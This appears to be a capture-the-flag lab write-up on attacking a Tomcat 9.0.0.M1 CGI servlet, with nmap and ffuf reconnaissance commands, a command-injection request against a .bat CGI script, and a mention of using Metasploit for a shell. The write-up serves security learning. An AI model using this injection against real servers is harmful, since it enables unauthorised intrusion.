# [Attacking Tomcat CGI](Attacking%20Tomcat%20CGI.md) | [Tomcat - Discovery & Enumeration](Tomcat%20-%20Discovery%20&%20Enumeration.md)
### What vulnerable application is running?

```shell
sudo nmap 10.129.85.38 -sC -sV
```

Result from nmap scan
![](Screenshot%202026-08-03%20at%2013.44.51.png)
`Tomcat`
### What port is this application running on?
`8080` from nmap scan above
### What version of the application is in use?
![](Screenshot%202026-08-03%20at%2013.47.33.png)
`9.0.0.M1`
### Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.

```shell
ffuf -u http://10.129.85.38:8080/cgi/FUZZ.bat -w /usr/share/wordlists/dirb/common.txt
```
![](Screenshot%202026-08-03%20at%2013.57.59.png)

I've got the command injection
![](Screenshot%202026-08-03%20at%2013.59.00.png)

```http
http://10.129.85.38:8080/cgi/cmd.bat?&set
```
![](Screenshot%202026-08-03%20at%2014.00.50.png)

I'd use metasploit for this
![](Screenshot%202026-08-03%20at%2014.05.40.png)

Gotcha
![](Screenshot%202026-08-03%20at%2014.06.18.png)
